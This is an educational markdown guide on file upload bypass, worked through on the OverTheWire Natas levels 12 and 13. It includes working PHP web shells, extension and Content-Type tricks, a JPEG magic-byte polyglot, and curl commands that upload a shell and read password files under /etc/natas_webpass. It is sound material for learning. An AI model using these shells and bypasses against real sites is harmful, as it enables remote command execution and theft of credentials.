# 🌐 Web Security — File Upload Bypass

> The application says "you can only upload images."
> But where is the "image" check done — and how is it done?

---

## 📋 Table of Contents

- [What Is a File Upload Vulnerability?](#what-is-a-file-upload-vulnerability)
- [Validation Methods and Their Bypasses](#validation-methods-and-their-bypasses)
- [What Is a Web Shell?](#what-is-a-web-shell)
- [Magic Bytes (File Signature)](#magic-bytes-file-signature)
- [Usage in Natas](#usage-in-natas)

---

## What Is a File Upload Vulnerability?

When the application allows file uploads, if it doesn't sufficiently check the type of the uploaded file, an attacker can upload a file containing executable code in PHP, Python, or another language.

```
Normal: upload image.jpg → /uploads/image.jpg → the browser displays it
Vulnerability: upload shell.php → /uploads/shell.php → the server executes it!
```

The server executes the PHP file, and the attacker can run arbitrary commands.

---

## Validation Methods and Their Bypasses

### 1. Extension Check (The Weakest)

```php
// BAD: only looks at the extension
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if ($ext !== 'jpg' && $ext !== 'png') {
    die("You can only upload images!");
}
```

**Bypass:**

```
shell.php        → rejected
shell.php.jpg    → may be accepted (runs as php on some servers)
shell.pHp        → upper/lowercase — passes some filters
shell.php5       → alternative PHP extension
shell.phtml      → PHP HTML — works on some servers
shell.phar       → PHP archive
```

### 2. MIME Type Check (Content-Type Header)

```php
// BAD: trusts the Content-Type header — under client control!
if ($_FILES['file']['type'] !== 'image/jpeg') {
    die("You can only upload JPEG!");
}
```

In an HTTP request, the `Content-Type` header is set by the client and can easily be changed with Burp Suite or curl.

**Bypass:**

```bash
# Fake the Content-Type with curl
curl -F "file=@shell.php;type=image/jpeg" http://example.com/upload.php

# With Burp: Content-Type: application/x-php  →  Content-Type: image/jpeg
```

### 3. Extension + MIME Check (Medium)

```php
$allowed_ext  = ['jpg', 'jpeg', 'png', 'gif'];
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];

$ext  = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$mime = $_FILES['file']['type'];   // ← still under client control!

if (!in_array($ext, $allowed_ext) || !in_array($mime, $allowed_mime)) {
    die("Invalid file!");
}
```

**Bypass:** Save the file as `shell.jpg`, set the Content-Type to `image/jpeg`, with PHP code as the content. On some servers it won't be executed based on the extension, but its content may be treated differently depending on the server-side configuration.

### 4. exif_imagetype() Check (Natas 13)

```php
// BETTER but still bypassable
if (!exif_imagetype($_FILES['file']['tmp_name'])) {
    die("This is not an image!");
}
```

`exif_imagetype()` determines the type by looking at the **first few bytes** of the file (the magic bytes). It doesn't check the entire content.

**Bypass:** Add a valid image magic byte at the beginning of the file, and write PHP code for the rest.

---

## What Is a Web Shell?

A web shell is a file that allows running commands on the web server. The simplest PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

If you upload this file to the server and send a parameter like `?cmd=id` from the URL:

```
http://example.com/uploads/shell.php?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Different Web Shell Examples

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>
```

The shortest and most useful for Natas:

```php
<?php passthru($_GET['cmd']); ?>
```

---

## Magic Bytes (File Signature)

Every file type carries fixed byte sequences at the start of the file. These bytes are called **magic bytes** or the **file signature**. The `file` command and `exif_imagetype()` determine the file type by looking at these bytes.

| File Type | Magic Bytes (Hex) | ASCII Equivalent |
|------------|-------------------|-----------------|
| JPEG | `FF D8 FF` | `ÿØÿ` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| GIF87a | `47 49 46 38 37 61` | `GIF87a` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |

### JPEG Magic Bytes + PHP Code

```
FF D8 FF E0  [JPEG header]  <?php passthru($_GET['cmd']); ?>
```

This file is both a valid JPEG and contains PHP code. `exif_imagetype()` looks at the start and says "JPEG" — but the PHP interpreter executes the `<?php` block.

---

## Usage in Natas

### Natas 12 — Extension Bypass

**Source code (summary):**

```php
<?php
function genRandomString() {
    // Generate a 10-character random name
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

$target_dir = "upload/";
$target_file = $target_dir . genRandomString() . ".jpg";  // ← the .jpg extension is fixed

if(isset($_POST['filename'])) {
    $target_file = $target_dir . $_POST['filename'];  // ← BUT it takes it from the filename parameter!
}

if(isset($_FILES['uploadedfile'])) {
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_file)) {
        print "The file <a href=\"$target_file\">$target_file</a> has been uploaded";
    }
}
?>
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="filename" value="[random].jpg">
    <input type="file" name="uploadedfile"><br>
    <input type="submit" value="Upload File">
</form>
```

**Analysis:**

- The form has a hidden `filename` field → its value ends with `.jpg`
- But the server uses the `$_POST['filename']` value as is
- If we change the `filename` value to the `.php` extension, the server saves a PHP file

**Exploit:**

```bash
# Step 1: Create the web shell file
echo '<?php passthru($_GET["cmd"]); ?>' > shell.php

# Step 2: Upload with the filename parameter set to .php
curl -u natas12:[password] \
     -F "filename=shell.php" \
     -F "uploadedfile=@shell.php" \
     http://natas12.natas.labs.overthewire.org/index.php

# Output: gives the upload/abc123xyz.php link

# Step 3: Run the web shell
curl -u natas12:[password] \
     "http://natas12.natas.labs.overthewire.org/upload/abc123xyz.php?cmd=cat+/etc/natas_webpass/natas13"
```

**With Burp Suite:**

1. Capture the request
2. Change the `filename=...jpg` line to `filename=shell.php`
3. Forward it → the PHP file is uploaded

---

### Natas 13 — exif_imagetype() Bypass

**Source code (summary):**

```php
<?php
if(isset($_POST['filename'])) {
    if(array_key_exists("uploadedfile", $_FILES)) {
        if($_FILES['uploadedfile']['size'] > 1000) {
            echo "File is too big";
        } else if(!exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
            echo "File is not an image";  // ← there's an exif_imagetype check!
        } else {
            // save
        }
    }
}
?>
```

`exif_imagetype()` looks at the magic bytes. We need to start our PHP code with JPEG magic bytes.

**Exploit:**

```bash
# Step 1: Create a file containing JPEG magic bytes + PHP code
python3 -c "
# JPEG magic bytes: FF D8 FF E0
import sys
header = b'\xff\xd8\xff\xe0'
payload = b'<?php passthru(\$_GET[\"cmd\"]); ?>'
sys.stdout.buffer.write(header + payload)
" > shell_jpg.php

# Step 2: Pass the exif_imagetype check, upload with the .php extension
curl -u natas13:[password] \
     -F "filename=shell.php" \
     -F "uploadedfile=@shell_jpg.php" \
     http://natas13.natas.labs.overthewire.org/index.php

# Step 3: Run the shell
curl -u natas13:[password] \
     "http://natas13.natas.labs.overthewire.org/upload/[file_name].php?cmd=cat+/etc/natas_webpass/natas14"
```

**What's Happening?**

```
exif_imagetype() → looks at the first 4 bytes → FF D8 FF E0 → "JPEG" ✓
PHP interpreter  → finds the <?php ... ?> block → executes it ✓
```

---

### File Upload Bypass — Checklist

```
Identify the validation type:
  ☐ Just the extension? → Try a different extension (.php5, .phtml)
  ☐ Content-Type? → Set it to image/jpeg with Burp
  ☐ exif_imagetype? → Add magic bytes
  ☐ getimagesize()? → Valid image + PHP code (polyglot)
  ☐ Is there a hidden input in the form? → Change filename/extension

After uploading:
  ☐ Where is the file saved? (find from the link or the source code)
  ☐ Can it be accessed directly via URL?
  ☐ Test with ?cmd=id
  ☐ Read the password: ?cmd=cat+/etc/natas_webpass/natas[X]
```

---

### Secure File Upload

```php
// 1. Extension whitelist + MIME whitelist
// 2. Validate the content with exif_imagetype() or getimagesize()
// 3. Save the file outside the web root (so it can't be accessed via URL)
// 4. Put the file in a directory where PHP can't execute it
// 5. Give a new random name (don't use the original name)
// 6. Set the content type header correctly (Content-Type: image/jpeg)
```

---

## 🔗 Resources

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PayloadsAllTheThings — File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [List of File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

---

**Previous topic:** [09_xor_encryption.md](./09_xor_encryption.md)
**Next topic:** [11_sql_injection.md](./11_sql_injection.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
